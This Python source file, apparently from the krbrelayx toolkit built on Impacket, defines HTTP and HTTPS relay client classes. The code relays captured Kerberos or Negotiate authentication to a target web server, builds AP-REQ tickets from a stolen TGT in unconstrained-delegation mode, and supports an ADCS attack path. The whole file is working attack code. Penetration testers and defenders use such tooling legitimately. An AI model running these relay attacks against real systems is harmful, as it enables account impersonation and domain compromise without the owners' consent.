# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Protocol Client
#   HTTP(s) client for relaying NTLMSSP authentication to webservers
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64

from struct import unpack
from impacket import LOG
from krbrelayx.lib.clients import ProtocolClient
from krbrelayx.lib.utils.kerberos import build_apreq
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]

class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort = 80, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None

    def initConnection(self, authdata, kdc=None):
        self.session = HTTPConnection(self.targetHost,self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        return self.doInitialActions(authdata, kdc)

    def doInitialActions(self, authdata, kdc=None):
        self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'Kerberos' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('Kerberos Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'Kerberos' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Kerberos"
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
            else:
                return False

        # Negotiate auth
        if self.serverConfig.mode == 'RELAY':
            # Relay mode is pass-through
            negotiate = base64.b64encode(authdata['krbauth']).decode("ascii")
        else:
            # Unconstrained delegation mode has to build TGT manually
            krbauth = build_apreq(authdata['domain'], kdc, authdata['tgt'], authdata['username'], 'http', self.targetHost)
            negotiate = base64.b64encode(krbauth).decode("ascii")

        headers = {'Authorization':'%s %s' % (self.authenticationMethod, negotiate)}
        self.session.request('GET', self.path ,headers=headers)
        res = self.session.getresponse()
        res.read()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned status code %d, treating as a successful login' % res.status)
            #Cache this
            self.lastresult = res.read()
            return None, STATUS_SUCCESS
        return True

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Do a HEAD for favicon.ico
        self.session.request('HEAD','/favicon.ico')
        self.session.getresponse()

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True ):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self, authdata, kdc=None):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        return self.doInitialActions(authdata, kdc)

